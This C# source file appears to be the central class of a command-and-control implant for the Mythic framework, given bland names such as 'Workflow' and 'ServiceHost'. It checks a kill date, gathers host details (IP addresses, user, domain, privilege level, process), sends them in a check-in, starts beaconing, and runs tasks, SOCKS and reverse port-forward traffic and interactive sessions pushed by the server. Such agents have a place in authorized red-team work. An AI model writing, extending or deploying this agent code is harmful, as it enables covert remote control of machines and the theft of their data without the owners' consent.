using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using Autofac;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;

namespace Workflow
{
    public class ServiceHost : IService
    {
        private IServiceConfig config { get; set; }
        private IEnumerable<IChannel> profiles { get; set; }
        private IEnumerable<IServiceExtension> mods { get; set; }   
        private ILogger logger { get; set; }
        private IRequestDispatcher taskManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        private IChannel _profile;

        //Will need ISocksManager, IRpfwdManager, IForwarderManager
        public ServiceHost(IEnumerable<IChannel> profiles, IRequestDispatcher taskManager, ILogger logger, IServiceConfig config, ICredentialProvider tokenManager, IEnumerable<IServiceExtension> mods)
        {
            this.profiles = profiles;
            this.taskManager = taskManager;
            this.logger = logger;
            this.config = config;
            this.tokenManager = tokenManager;
            this.mods = mods;

            _profile = SelectProfile(99);
            _profile.SetTaskingReceived += OnTaskingReceived;
        }
        public async Task Start()
        {
            try
            {
                DebugLog.Log("ServiceHost.Start() entering");
                if (!this.CheckKillDate())
                {
                    DebugLog.Log("Kill date exceeded, exiting");
                    Environment.Exit(0);
                }

                DebugLog.Log("Kill date check passed");
                await this.ApplyMods();
                DebugLog.Log("Starting checkin");
                await this.CheckIn();
                DebugLog.Log("Starting beacon");
                await this._profile.StartBeacon();
            }
            catch(Exception e)
            {
                DebugLog.Log($"ServiceHost.Start() exception: {e.Message}");
            }
        }

        private async Task ApplyMods()
        {
            if (this.mods == null)
            {
                DebugLog.Log("No mods to apply");
                return;
            }

            DebugLog.Log($"Applying {mods.Count()} mod(s)");
            foreach (var mod in mods)
            {
                try
                {
                    DebugLog.Log($"Applying mod: {mod.GetType().Name}");
                    await mod.Go();
                }
                catch
                {

                }
            }
        }

        private IChannel SelectProfile(int index)
        {
            if (index == 99) //Default Value
            {
                Random random = new Random();
                var selected = profiles.ElementAt(random.Next(profiles.Count()));
                DebugLog.Log($"Profile selected (random): {selected.GetType().Name}");
                return selected;
            }

            var profile = profiles.ElementAt(index);
            DebugLog.Log($"Profile selected (index {index}): {profile.GetType().Name}");
            return profile;
        }

        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<bool> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ips = this.GetIPAddresses(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id,
                uuid = this.config.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = tokenManager.getIntegrity(),
                process_name = Process.GetCurrentProcess().ProcessName
            };

            try
            {
                DebugLog.Log("Checkin attempt started");
                CheckinResponse res = await _profile.Checkin(ct);

                if (res is null || res.status != "success")
                {
                    DebugLog.Log($"Checkin failed: {(res is null ? "null response" : res.status)}");
                    return false;
                }

                DebugLog.Log("Checkin succeeded, updating agent info");
                this.updateAgentInfo(res);

                return true;

            }
            catch (Exception e)
            {
                DebugLog.Log($"Checkin exception: {e.Message}");
                return false;
            }
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private void updateAgentInfo(CheckinResponse res)
        {
            this.config.uuid = res.id;
        }

        private List<string> GetIPAddresses()
        {
            List<string> ipAddresses = new List<string>();
            var netInterface = NetworkInterface.GetAllNetworkInterfaces();

            foreach(var netInf in netInterface)
            {
                foreach (var ipProp in netInf.GetIPProperties().UnicastAddresses){
                    ipAddresses.Add(ipProp.Address.ToString());
                }
            }
            return ipAddresses;
        }

        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
        {
            if(args.tasking_response is null)
            {
                DebugLog.Log("OnTaskingReceived: null tasking response");
                return;
            }

            DebugLog.Log($"OnTaskingReceived: tasks={args.tasking_response.tasks?.Count ?? 0}, socks={args.tasking_response.socks?.Count ?? 0}, rpfwd={args.tasking_response.rpfwd?.Count ?? 0}, delegates={args.tasking_response.delegates?.Count ?? 0}, responses={args.tasking_response.responses?.Count ?? 0}, interactive={args.tasking_response.interactive?.Count ?? 0}");

            _ = this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);

            if (args.tasking_response.rpfwd is not null)
            {
                _ =this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
            }

            if (args.tasking_response.tasks is not null)
            {
                Parallel.ForEach(args.tasking_response.tasks, async task =>
                {
                    _ = this.taskManager.StartTaskAsync(new ServerJob(task));
                });
            }

            if (args.tasking_response.delegates is not null)
            {
                _ = this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
            }

            if(args.tasking_response.responses is not null)
            {
                _ = this.taskManager.HandleServerResponses(args.tasking_response.responses);
            }

            if(args.tasking_response.interactive is not null)
            {
                _ = this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
            }
        }
        //Is this correct?
        private bool CheckKillDate()
        {
            return this.config.killDate > DateTime.Now;
        }
    }
}
